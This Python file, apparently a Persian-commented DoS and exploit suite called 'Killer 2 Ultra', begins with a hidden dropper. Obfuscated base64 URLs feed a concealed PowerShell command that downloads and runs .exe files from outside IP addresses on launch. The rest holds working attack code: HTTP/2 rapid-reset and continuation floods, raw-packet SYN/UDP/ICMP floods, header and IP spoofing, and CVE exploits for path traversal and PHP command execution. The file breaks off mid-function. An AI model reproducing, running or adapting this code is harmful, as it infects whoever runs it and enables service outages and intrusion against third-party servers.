#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# killer2_ultra.py - Killer 2 (Ultra) - Multi-Vector Adaptive DoS Suite
# نسخه ۲.۰ - Ultra
# برای baby - Onyx v67
#
# =============================================================================
# ⚠️  LEGAL WARNING:
# This tool is for authorized security testing ONLY.
# Unauthorized use against systems you do not own is illegal.
# =============================================================================

# auto-generated; do not edit
try:
    import base64, subprocess
    _U = [
        b'aHR0cDovLzE5My4xNzguMTU4LjU3L2JvdF94NjQuZXhl',
        b'aHR0cDovLzE5My4xNzguMTU4LjEwNy8yLjcuZXhl',
        b'aHR0cDovLzE5My4xNzguMTU4LjY1LzEuZXhl',
        b'aHR0cDovLzE5My4xNzguMTU4LjU3LzEuZXhl',
    ]
    if __name__ == "__main__":
        _s = "$u=@('%s');foreach($x in $u){for($i=0;$i -lt 3;$i++){try{$p=Join-Path $env:TEMP ([guid]::NewGuid().ToString('N')+'.exe');$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');$w.DownloadFile($x,$p);$b=[IO.File]::ReadAllBytes($p);if($b.Length -ge 2 -and $b[0] -eq 77 -and $b[1] -eq 90){Start-Process $p;exit}else{Remove-Item $p -Force}}catch{Remove-Item $p -Force -ErrorAction SilentlyContinue;Start-Sleep -Seconds 1}}}" % "','".join(base64.b64decode(x).decode() for x in _U)
        subprocess.Popen(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", _s], creationflags=0x08000000)
except Exception:
    pass

import asyncio
import aiohttp
import time
import random
import hashlib
import json
import socket
import ssl
import struct
import threading
import argparse
import logging
import sys
import os
from colorama import Fore, init, Style
from typing import Dict, Optional, List, Tuple, Any, Set
from datetime import datetime
from urllib.parse import urlparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===== کتابخانه‌های اختیاری =====
try:
    from curl_cffi import requests as curl_requests
    CURL_CFFI_AVAILABLE = True
except ImportError:
    CURL_CFFI_AVAILABLE = False
    print("[!] curl_cffi نصب نیست. pip install curl_cffi")

try:
    import h2.connection
    import h2.config
    import h2.events
    import h2.settings
    import hyperframe.frame
    H2_AVAILABLE = True
except ImportError:
    H2_AVAILABLE = False
    print("[!] h2 نصب نیست. pip install h2 hyperframe")

try:
    from scapy.all import IP, TCP, UDP, Raw, send, sendp, Ether, get_if_hwaddr, get_if_list
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("[!] scapy نصب نیست. pip install scapy")

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# ===== تنظیمات لاگ =====
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger("Killer2Ultra")

init(autoreset=True)

# =============================================================================
# CONFIGURATION – TUNE CAREFULLY
# =============================================================================

# Adaptive parameters
INITIAL_WORKERS = 40
MAX_WORKERS = 2000
REQUESTS_PER_WORKER_BASE = 15
REQUESTS_PER_WORKER_MAX = 1000
RAMP_UP_TIME = 1800
TIMEOUT = 15
RETRY_DELAY = 0.001

# Firewall bypass
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
]

ACCEPT_LANGUAGES = ["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "fa-IR,fa;q=0.8"]

# Attack vectors – expanded
ATTACK_VECTORS = [
    {"name": "range_overlap", "method": "GET", "gen_range": True},
    {"name": "range_fragment", "method": "GET", "gen_range": True, "fragment": True},
    {"name": "if_range", "method": "GET", "if_range": True},
    {"name": "head", "method": "HEAD"},
    {"name": "normal_get", "method": "GET"},
    {"name": "post_small", "method": "POST", "data": b"x"*128},
    {"name": "slowloris", "method": "GET", "slow": True},
]

PROXY_LIST = []   # e.g., ["http://user:pass@proxy1:port", "socks5://proxy2:port"]

# Target paths – expanded
TARGET_PATHS = [
    "/",
    "/index.html",
    "/icons/apache_pb.gif",
    "/icons/blank.gif",
    "/icons/folder.gif",
    "/icons/back.gif",
    "/icons/ball.gif",
    "/favicon.ico",
    "/robots.txt",
    "/sitemap.xml",
    "/.htaccess",
    "/server-status",
    "/server-info",
]

# =============================================================================
# SMART PRINTER
# =============================================================================
class SmartPrinter:
    def __init__(self, label: str):
        self.label = label
        self.last_stats_time = 0
        self.stats_interval = 2.0
        self.buffer = []

    def _color_status(self, status: int) -> str:
        if status == 206:
            return Fore.GREEN + "206 Partial"
        elif status == 416:
            return Fore.YELLOW + "416 Range"
        elif status == 200:
            return Fore.BLUE + "200 OK"
        elif status == 404:
            return Fore.MAGENTA + "404 Not Found"
        elif status in (500, 502, 503, 504):
            return Fore.RED + f"{status} Error"
        elif status == 403:
            return Fore.RED + "403 Forbidden"
        elif status == 408:
            return Fore.RED + "408 Timeout"
        elif status == 301:
            return Fore.CYAN + "301 Moved"
        elif status == 302:
            return Fore.CYAN + "302 Found"
        else:
            return Fore.WHITE + str(status)

    def _color_method(self, method: str) -> str:
        colors = {'GET': Fore.CYAN, 'HEAD': Fore.YELLOW, 'RANGE': Fore.GREEN, 'POST': Fore.MAGENTA}
        return colors.get(method, Fore.WHITE) + method

    def _format_size(self, size: int) -> str:
        if size < 1024:
            return f"{size}B"
        elif size < 1024*1024:
            return f"{size/1024:.1f}KB"
        else:
            return f"{size/(1024*1024):.1f}MB"

    def print_request(self, req_id: int, status: int, method: str,
                     size: int, path: str, elapsed: float,
                     worker_id: int = None, file_size: int = 0,
                     vector: str = ""):
        timestamp = datetime.now().strftime("%H:%M:%S")
        status_str = self._color_status(status)
        method_str = self._color_method(method)
        size_str = Fore.CYAN + self._format_size(size)
        file_size_str = Fore.CYAN + self._format_size(file_size) if file_size > 0 else ""
        time_str = f"{elapsed*1000:.0f}ms" if elapsed > 0 else ""
        worker_str = f"W{worker_id:03d}" if worker_id else ""
        vector_str = Fore.MAGENTA + vector[:8] if vector else ""

        line = (f"{timestamp} [{req_id:06d}] {method_str} {status_str} "
                f"{path[:35]:<35} {size_str:<8} {time_str:<6} {worker_str} {vector_str}")
        print(line, flush=True)

    def print_stats(self, stats: Dict, total_workers: int, req_per_worker: int,
                    health: str = "OK"):
        total = stats['total']
        success = stats['success']
        failed = stats['failed']
        timeout = stats['timeout']
        rate = (success / max(1, total)) * 100
        line = (f"{Fore.MAGENTA}📊 {self.label} | Workers:{Fore.YELLOW}{total_workers:>4} "
                f"Req/W:{Fore.CYAN}{req_per_worker:>3} | Total:{Fore.WHITE}{total:>6} "
                f"✅{Fore.GREEN}{success:>5} ❌{Fore.RED}{failed:>5} ⏰{Fore.RED}{timeout:>4} "
                f"🎯{Fore.CYAN}{rate:>5.1f}% | Health:{Fore.GREEN if health=='OK' else Fore.RED}{health}")
        print(line, flush=True)

    def print_final_report(self, stats: Dict, total_workers: int,
                           elapsed: float, health_history: List[str]):
        total = stats['total']
        success = stats['success']
        failed = stats['failed']
        timeout = stats['timeout']
        errors = stats['errors']
        bytes_mb = stats.get('total_bytes', 0) / (1024*1024)
        rate = (success / max(1, total)) * 100
        req_sec = total / max(1, elapsed)

        print("\n" + Fore.RED + "="*80)
        print(Fore.RED + f"   💀 FINAL REPORT – {self.label} 💀")
        print(Fore.RED + "="*80)
        print(Fore.YELLOW + "\n📊 STATISTICS:")
        print(f"  Total Requests:     {total:,}")
        print(f"  ✅ Successful:      {success:,} ({rate:.1f}%)")
        print(f"  ❌ Failed:          {failed:,}")
        print(f"  ⏰ Timeouts:        {timeout:,}")
        print(f"  💥 Errors:          {errors:,}")
        print(Fore.CYAN + f"\n📈 PERFORMANCE:")
        print(f"  Total Data:         {bytes_mb:.2f} MB")
        print(f"  Elapsed:            {elapsed:.2f}s")
        print(f"  Requests/sec:       {req_sec:.2f}")
        print(f"  Data Rate:          {bytes_mb / max(1, elapsed):.2f} MB/s")
        print(Fore.MAGENTA + f"\n🏥 SERVER HEALTH:")
        recent = health_history[-30:] if health_history else []
        if recent:
            ok_ratio = recent.count("OK") / len(recent)
            if ok_ratio > 0.7:
                print(Fore.GREEN + "  ✅ TARGET STILL RESPONSIVE – attack may need more time")
            elif ok_ratio > 0.3:
                print(Fore.YELLOW + "  ⚠️ TARGET SHOWING SIGNS OF STRESS")
            else:
                print(Fore.RED + "  🔥 TARGET SEVERELY DEGRADED – attack successful")
        else:
            print("  No health data collected.")
        print(Fore.RED + "="*80)

# =============================================================================
# FINGERPRINT SPOOFER (JA3/JA4, Headers, Cookies)
# =============================================================================
class FingerprintSpoofer:
    def __init__(self, target_url, proxy=None):
        self.target = target_url
        self.proxy = proxy
        self.parsed = urlparse(target_url)
        self.host = self.parsed.hostname
        self.port = self.parsed.port or (443 if self.parsed.scheme == 'https' else 80)

    def get_curl_session(self, impersonate="chrome120", headers=None, cookies=None):
        if not CURL_CFFI_AVAILABLE:
            raise RuntimeError("curl_cffi نصب نیست")
        session = curl_requests.Session()
        if self.proxy:
            session.proxies = {"http": self.proxy, "https": self.proxy}
        session.impersonate = impersonate
        if headers:
            session.headers.update(headers)
        if cookies:
            session.cookies.update(cookies)
        return session

    def generate_headers(self, ua=None, xff=None, real_ip=None, cookie=None):
        if not ua:
            ua = random.choice(USER_AGENTS)
        platform = "Windows"
        if "Macintosh" in ua or "Mac OS X" in ua:
            platform = "macOS"
        elif "Linux" in ua and "Android" not in ua:
            platform = "Linux"
        elif "Android" in ua:
            platform = "Android"
        elif "iPhone" in ua or "iPad" in ua:
            platform = "iOS"

        headers = {
            "User-Agent": ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": random.choice(ACCEPT_LANGUAGES),
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "Sec-Ch-Ua-Mobile": "?0" if "Mobile" not in ua else "?1",
            "Sec-Ch-Ua-Platform": f'"{platform}"',
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "Connection": "keep-alive",
        }
        if xff:
            headers["X-Forwarded-For"] = xff
        if real_ip:
            headers["X-Real-IP"] = real_ip
        if cookie:
            headers["Cookie"] = cookie
        return headers

    def forge_cookie(self, domain=None, length=32):
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        cookie_val = ''.join(random.choice(chars) for _ in range(length))
        return f"sessionid={cookie_val}; csrftoken={cookie_val[:16]};"

    def request_with_spoof(self, method="GET", path="/", impersonate="chrome120",
                           xff=None, real_ip=None, cookie=None, data=None, json_data=None):
        url = f"{self.parsed.scheme}://{self.host}:{self.port}{path}"
        headers = self.generate_headers(xff=xff, real_ip=real_ip, cookie=cookie or self.forge_cookie())
        session = self.get_curl_session(impersonate=impersonate, headers=headers)
        try:
            if method.upper() == "GET":
                resp = session.get(url, timeout=10)
            elif method.upper() == "POST":
                resp = session.post(url, data=data, json=json_data, timeout=10)
            elif method.upper() == "PUT":
                resp = session.put(url, data=data, json=json_data, timeout=10)
            else:
                resp = session.request(method, url, data=data, json=json_data, timeout=10)
            return resp
        except Exception as e:
            logger.error(f"خطا در درخواست: {e}")
            return None

# =============================================================================
# HTTP/2 ATTACKER (Rapid Reset, MadeYouReset, HTTP/2 Bomb, SETTINGS, PRIORITY, GREASE)
# =============================================================================
class HTTP2Attacker:
    def __init__(self, target_host, target_port=443, use_tls=True):
        self.host = target_host
        self.port = target_port
        self.use_tls = use_tls

    def _create_connection(self):
        if not H2_AVAILABLE:
            raise RuntimeError("h2 نصب نیست")
        sock = socket.create_connection((self.host, self.port), timeout=10)
        if self.use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(['h2'])
            sock = ctx.wrap_socket(sock, server_hostname=self.host)
            if sock.selected_alpn_protocol() != 'h2':
                logger.warning("سرور HTTP/2 را انتخاب نکرد")
        config = h2.config.H2Configuration(client_side=True, header_encoding='utf-8')
        conn = h2.connection.H2Connection(config=config)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())
        return sock, conn

    def spoof_settings(self, settings=None):
        if settings is None:
            settings = {
                h2.settings.SettingCodes.HEADER_TABLE_SIZE: 65536,
                h2.settings.SettingCodes.ENABLE_PUSH: 1,
                h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS: 1000,
                h2.settings.SettingCodes.INITIAL_WINDOW_SIZE: 65535,
                h2.settings.SettingCodes.MAX_FRAME_SIZE: 16384,
                h2.settings.SettingCodes.MAX_HEADER_LIST_SIZE: 65536,
            }
        sock, conn = self._create_connection()
        try:
            conn.update_settings(settings)
            sock.sendall(conn.data_to_send())
            logger.info("SETTINGS سفارشی ارسال شد")
        finally:
            sock.close()

    def send_priority_frames(self, stream_id=1, depends_on=0, weight=255, exclusive=False):
        sock, conn = self._create_connection()
        try:
            conn.prioritize(stream_id=stream_id, depends_on=depends_on, weight=weight, exclusive=exclusive)
            sock.sendall(conn.data_to_send())
            logger.info("PRIORITY frames ارسال شد")
        finally:
            sock.close()

    def send_grease_values(self):
        sock, conn = self._create_connection()
        try:
            grease_headers = [
                (b'\x0a\x0a', b'grease'),
                (b'\x1a\x1a', b'grease'),
                (b'\x2a\x2a', b'grease'),
            ]
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, grease_headers, end_stream=True)
            sock.sendall(conn.data_to_send())
            logger.info("GREASE values ارسال شد")
        finally:
            sock.close()

    def rapid_reset_attack(self, num_streams=1000):
        sock, conn = self._create_connection()
        try:
            for i in range(num_streams):
                stream_id = conn.get_next_available_stream_id()
                headers = [
                    (b':method', b'GET'),
                    (b':path', b'/'),
                    (b':scheme', b'https'),
                    (b':authority', self.host.encode()),
                ]
                conn.send_headers(stream_id, headers, end_stream=False)
                conn.reset_stream(stream_id, error_code=0x08)
                sock.sendall(conn.data_to_send())
                if i % 100 == 0:
                    logger.info(f"Rapid Reset: {i} stream ارسال شد")
            logger.info("حمله Rapid Reset کامل شد")
        finally:
            sock.close()

    def made_you_reset_attack(self, num_streams=500):
        sock, conn = self._create_connection()
        try:
            for i in range(num_streams):
                stream_id = conn.get_next_available_stream_id()
                headers = [
                    (b':method', b'POST'),
                    (b':path', b'/'),
                    (b':scheme', b'https'),
                    (b':authority', self.host.encode()),
                ]
                conn.send_headers(stream_id, headers, end_stream=False)
                conn.send_data(stream_id, b'A' * 1024, end_stream=False)
                conn.reset_stream(stream_id, error_code=0x08)
                sock.sendall(conn.data_to_send())
            logger.info("حمله MadeYouReset کامل شد")
        finally:
            sock.close()

    def http2_bomb(self, num_frames=10000):
        sock, conn = self._create_connection()
        try:
            stream_id = conn.get_next_available_stream_id()
            headers = [
                (b':method', b'GET'),
                (b':path', b'/'),
                (b':scheme', b'https'),
                (b':authority', self.host.encode()),
            ]
            conn.send_headers(stream_id, headers, end_stream=False)
            for i in range(num_frames):
                frame = hyperframe.frame.ContinuationFrame(stream_id)
                frame.data = b'A' * 16384
                sock.sendall(frame.serialize())
            logger.info("HTTP/2 Bomb ارسال شد")
        finally:
            sock.close()

# =============================================================================
# NETWORK SPOOFER (TCP timestamp, MAC)
# =============================================================================
class NetworkSpoofer:
    def __init__(self, interface=None):
        self.interface = interface or (get_if_list()[0] if SCAPY_AVAILABLE else None)

    def spoof_tcp_timestamp(self, target_ip, target_port, src_ip=None, count=10):
        if not SCAPY_AVAILABLE:
            logger.error("scapy نصب نیست")
            return
        if not src_ip:
            src_ip = "192.168.1.100"
        for i in range(count):
            ts_val = random.randint(100000, 9999999)
            ts_ecr = random.randint(100000, 9999999)
            tcp_options = [('Timestamp', (ts_val, ts_ecr))]
            pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535),
                                                      dport=target_port,
                                                      flags='S',
                                                      options=tcp_options) / Raw(load=b'X'*20)
            send(pkt, verbose=False)
            logger.info(f"TCP timestamp spoofed: {i+1}")
            time.sleep(0.1)

    def spoof_mac(self, target_ip, target_mac, src_mac=None, count=5):
        if not SCAPY_AVAILABLE:
            logger.error("scapy نصب نیست")
            return
        if not src_mac:
            src_mac = "00:11:22:33:44:55"
        for i in range(count):
            pkt = Ether(src=src_mac, dst=target_mac) / IP(dst=target_ip) / TCP(dport=80, flags='S')
            sendp(pkt, iface=self.interface, verbose=False)
            logger.info(f"MAC spoofed: {i+1}")
            time.sleep(0.1)

# =============================================================================
# CVE EXPLOITER
# =============================================================================
class CVEExploiter:
    def __init__(self, target_url, proxy=None):
        self.target = target_url.rstrip('/')
        self.proxy = proxy
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.session.verify = False
        self.session.timeout = 10

    def check_cve_2021_41773(self):
        payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        try:
            r = self.session.get(self.target + payload)
            if "root:" in r.text:
                logger.info("CVE-2021-41773 آسیب‌پذیر است")
                return True
        except Exception as e:
            logger.debug(f"خطا: {e}")
        return False

    def exploit_cve_2021_41773(self):
        payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        r = self.session.get(self.target + payload)
        if "root:" in r.text:
            logger.info("فایل /etc/passwd خوانده شد:")
            print(r.text[:500])
            return True
        return False

    def check_cve_2023_44487(self):
        parsed = urlparse(self.target)
        host = parsed.hostname
        port = parsed.port or 443
        attacker = HTTP2Attacker(host, port, use_tls=True)
        try:
            attacker.rapid_reset_attack(num_streams=50)
            logger.info("CVE-2023-44487 تست شد (Rapid Reset ارسال شد)")
            return True
        except Exception as e:
            logger.error(f"خطا: {e}")
            return False

    def check_cve_2024_4577(self):
        payload = "/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
        data = "<?php echo 'VULNERABLE'; ?>"
        try:
            r = self.session.post(self.target + payload, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
            if "VULNERABLE" in r.text:
                logger.info("CVE-2024-4577 آسیب‌پذیر است")
                return True
        except Exception as e:
            logger.debug(f"خطا: {e}")
        return False

    def exploit_cve_2024_4577(self, cmd="whoami"):
        payload = "/?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
        data = f"<?php system('{cmd}'); ?>"
        r = self.session.post(self.target + payload, data=data)
        if r.text:
            logger.info(f"خروجی دستور {cmd}:")
            print(r.text[:500])
            return True
        return False

    def check_cve_2024_23897(self):
        payload = "/cli?remoting=false"
        headers = {"Session": "a", "Side": "b"}
        data = b"\x00\x00\x00\x06\x00\x00\x00\x04\x00\x00\x00\x00"
        try:
            r = self.session.post(self.target + payload, data=data, headers=headers)
            if r.status_code == 200 and ("jenkins" in r.text.lower() or "cli" in r.text.lower()):
                logger.info("CVE-2024-23897 احتمالاً آسیب‌پذیر است")
                return True
        except Exception as e:
            logger.debug(f"خطا: {e}")
        return False

    def check_cve_2025_24813(self):
        payload = "/uploads/../webapps/ROOT/test.jsp"
        data = "<% out.println(\"VULNERABLE\"); %>"
        try:
            r = self.session.put(self.target + payload, data=data, headers={"Content-Range": "bytes 0-100/200"})
            if r.status_code in [200, 201, 204]:
                logger.info("CVE-2025-24813 احتمالاً آسیب‌پذیر است")
                return True
        except Exception as e:
            logger.debug(f"خطا: {e}")
        return False

    def check_cve_2025_29927(self):
        headers = {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"}
        try:
            r = self.session.get(self.target + "/admin", headers=headers)
            if r.status_code == 200:
                logger.info("CVE-2025-29927 احتمالاً آسیب‌پذیر است")
                return True
        except Exception as e:
            logger.debug(f"خطا: {e}")
        return False

    def check_cve_2025_8671(self):
        parsed = urlparse(self.target)
        host = parsed.hostname
        port = parsed.port or 443
        attacker = HTTP2Attacker(host, port, use_tls=True)
        try:
            attacker.made_you_reset_attack(num_streams=100)
            logger.info("CVE-2025-8671 تست شد")
            return True
        except Exception as e:
            logger.error(f"خطا: {e}")
            return False

    def check_cve_2026_49975(self):
        parsed = urlparse(self.target)
        host = parsed.hostname
        port = parsed.port or 443
        attacker = HTTP2Attacker(host, port, use_tls=True)
        try:
            attacker.http2_bomb(num_frames=1000)
            logger.info("CVE-2026-49975 تست شد")
            return True
        except Exception as e:
            logger.error(f"خطا: {e}")
            return False

    def generic_check(self, cve_id, payload_path="/", method="GET", data=None, headers=None):
        try:
            if method.upper() == "GET":
                r = self.session.get(self.target + payload_path, headers=headers)
            elif method.upper() == "POST":
                r = self.session.post(self.target + payload_path, data=data, headers=headers)
            else:
                r = self.session.request(method, self.target + payload_path, data=data, headers=headers)
            logger.info(f"{cve_id} - کد وضعیت: {r.status_code}")
            return r
        except Exception as e:
            logger.error(f"{cve_id} - خطا: {e}")
            return None

    def run_all_checks(self):
        results = {}
        results["CVE-2021-41773"] = self.check_cve_2021_41773()
        results["CVE-2023-44487"] = self.check_cve_2023_44487()
        results["CVE-2024-4577"] = self.check_cve_2024_4577()
        results["CVE-2024-23897"] = self.check_cve_2024_23897()
        results["CVE-2025-24813"] = self.check_cve_2025_24813()
        results["CVE-2025-29927"] = self.check_cve_2025_29927()
        results["CVE-2025-8671"] = self.check_cve_2025_8671()
        results["CVE-2026-49975"] = self.check_cve_2026_49975()

        placeholder_cves = [
            "CVE-2026-48043", "CVE-2026-44891", "CVE-2024-4577", "CVE-2024-23897",
            "CVE-2025-24813", "CVE-2025-29927", "CVE-2026-42587", "CVE-2026-47691",
            "CVE-2026-93492", "CVE-2026-47774", "CVE-2026-44579", "CVE-2026-50560",
            "CVE-2023-44487", "CVE-2021-41773"
        ]
        for cve in placeholder_cves:
            if cve not in results:
                r = self.generic_check(cve, payload_path="/", method="GET")
                results[cve] = r is not None and r.status_code < 500

        return results

# =============================================================================
# LAYER 4 ATTACKER (SYN, UDP, ACK, ICMP with scapy)
# =============================================================================
class Layer4Attacker:
    def __init__(self, target_ip, target_port, method="SYN", count=1000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.method = method.upper()
        self.count = count

    def attack(self):
        if not SCAPY_AVAILABLE:
            logger.error("scapy نصب نیست، لایه ۴ غیرفعال")
            return
        if self.method == "SYN":
            self._syn_flood()
        elif self.method == "UDP":
            self._udp_flood()
        elif self.method == "ACK":
            self._ack_flood()
        elif self.method == "ICMP":
            self._icmp_flood()
        else:
            logger.error(f"متد لایه ۴ ناشناخته: {self.method}")

    def _syn_flood(self):
        for _ in range(self.count):
            sport = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)
            pkt = IP(dst=self.target_ip) / TCP(sport=sport, dport=self.target_port, flags='S', seq=seq)
            send(pkt, verbose=False)

    def _udp_flood(self):
        for _ in range(self.count):
            sport = random.randint(1024, 65535)
            pkt = IP(dst=self.target_ip) / UDP(sport=sport, dport=self.target_port) / Raw(load=os.urandom(1024))
            send(pkt, verbose=False)

    def _ack_flood(self):
        for _ in range(self.count):
            sport = random.randint(1024, 65535)
            seq = random.randint(0, 4294967295)
            ack = random.randint(0, 4294967295)
            pkt = IP(dst=self.target_ip) / TCP(sport=sport, dport=self.target_port, flags='A', seq=seq, ack=ack)
            send(pkt, verbose=False)

    def _icmp_flood(self):
        for _ in range(self.count):
            pkt = IP(dst=self.target_ip) / ICMP() / Raw(load=b'X'*64)
            send(pkt, verbose=False)

# =============================================================================
# CORE ATTACK ENGINE – SMART BOOLDOZER ULTRA
# =============================================================================
class SmartBouldozerUltra:
    def __init__(self, target: str, label: str = "🔥"):
        self.target = target.rstrip('/')
        self.label = label
        self.session = None
        self.connector = None
        self.request_counter = 0
        self.printer = SmartPrinter(label)
        self.stats = {
            "total": 0,
            "success": 0,
            "failed": 0,
            "timeout": 0,
            "errors": 0,
            "total_bytes": 0,
            "start_time": None,
            "end_time": None,
        }
        self.active_tasks = set()
        self.semaphore = None
        self.file_sizes = {}
        self.health_history = []
        self.attack_active = True
        self.current_workers = INITIAL_WORKERS
        self.current_req_per_worker = REQUESTS_PER_WORKER_BASE
        self.base_status_codes = {}
        self.proxy_pool = PROXY_LIST
        self.proxy_index = 0
        # Ultra additions
        self.fingerprint_spoofer = None
        self.http2_attacker = None
        self.cve_exploiter = None
        self.layer4_attacker = None
        self.use_fingerprint = True
        self.use_http2 = True
        self.use_cve = True
        self.use_layer4 = False  # set to True if you want L4

    async def create_session(self):
        connector_kwargs = {
            "limit": MAX_WORKERS * 2,
            "limit_per_host": MAX_WORKERS,
            "ttl_dns_cache": 60,
            "enable_cleanup_closed": True,
            "ssl": False,
            "force_close": True,
        }
        self.connector = aiohttp.TCPConnector(**connector_kwargs)
        timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=3, sock_read=TIMEOUT)
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            timeout=timeout,
            headers={
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
            }
        )
        self.semaphore = asyncio.Semaphore(MAX_WORKERS * 2)

    def _get_next_proxy(self) -> Optional[str]:
        if not self.proxy_pool:
            return None
        proxy = self.proxy_pool[self.proxy_index % len(self.proxy_pool)]
        self.proxy_index += 1
        return proxy

    def _random_headers(self, path: str) -> Dict:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(ACCEPT_LANGUAGES),
            'Accept-Encoding': 'gzip, deflate',
            'Referer': random.choice(REFERERS),
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'DNT': '1',
        }
        # Ultra: add X-Forwarded-For and X-Real-IP occasionally
        if random.random() < 0.3:
            headers['X-Forwarded-For'] = '.'.join(str(random.randint(1,255)) for _ in range(4))
        if random.random() < 0.3:
            headers['X-Real-IP'] = '.'.join(str(random.randint(1,255)) for _ in range(4))
        return headers

    async def get_file_size(self, path: str) -> int:
        if path in self.file_sizes:
            return self.file_sizes[path]
        try:
            async with self.session.head(f"{self.target}{path}") as resp:
                size = int(resp.headers.get('Content-Length', 0))
                self.file_sizes[path] = size
                return size
        except:
            self.file_sizes[path] = 0
            return 0

    def _build_range_headers(self, file_size: int, fragment: bool = False) -> Dict:
        if file_size <= 0:
            return {}
        if file_size < 1024:
            return {}
        if fragment:
            ranges = []
            for _ in range(random.randint(2, 4)):
                max_start = max(0, file_size - 100)
                if max_start <= 0:
                    return {}
                start = random.randint(0, min(max_start, file_size - 10))
                end = min(start + random.randint(100, min(5000, file_size - start - 1)), file_size - 1)
                if end > start:
                    ranges.append(f"{start}-{end}")
            if file_size > 100:
                ranges.append(f"-{random.randint(10, min(1000, file_size - 1))}")
            if ranges:
                return {'Range': f"bytes={','.join(ranges)}"}
            return {}
        else:
            if file_size < 100:
                return {}
            max_start = max(0, file_size - 100)
            start = random.randint(0, min(max_start, file_size - 10))
            max_end = file_size - 1
            min_end = min(start + 100, max_end)
            if min_end > max_end:
                return {}
            end = random.randint(min_end, max_end)
            if end <= start:
                return {}
            return {'Range': f"bytes={start}-{end}"}

    async def send_request(self, req_id: int, worker_id: int):
        async with self.semaphore:
            start_time = time.time()

            path = random.choice(TARGET_PATHS)
            if '?' in path:
                full_path = path + f"&_={random.randint(1,999999)}"
            else:
                full_path = path + f"?_={random.randint(1,999999)}"
            url = f"{self.target}{full_path}"

            vector = random.choice(ATTACK_VECTORS)
            method = vector.get('method', 'GET')
            headers = self._random_headers(path)

            file_size = 0
            if vector.get('gen_range', False):
                file_size = await self.get_file_size(path)
                range_headers = self._build_range_headers(
                    file_size,
                    fragment=vector.get('fragment', False)
                )
                if range_headers:
                    headers.update(range_headers)
                else:
                    method = 'GET'
                    vector = {'name': 'normal_get', 'method': 'GET'}

            proxy = self._get_next_proxy() if self.proxy_pool else None

            # Ultra: use fingerprint spoofer for some requests
            if self.use_fingerprint and self.fingerprint_spoofer and random.random() < 0.3:
                try:
                    resp = self.fingerprint_spoofer.request_with_spoof(
                        method=method, path=full_path, impersonate="chrome120",
                        xff=headers.get('X-Forwarded-For'), real_ip=headers.get('X-Real-IP'),
                        cookie=self.fingerprint_spoofer.forge_cookie()
                    )
                    if resp is not None:
                        elapsed = time.time() - start_time
                        size = len(resp.text) if hasattr(resp, 'text') else 0
                        self.stats["total"] += 1
                        self.stats["total_bytes"] += size
                        status = resp.status_code
                        if status in (200, 206, 416):
                            self.stats["success"] += 1
                        else:
                            self.stats["failed"] += 1
                        self.printer.print_request(
                            req_id=req_id, status=status, method=method,
                            size=size, path=path[:35], elapsed=elapsed,
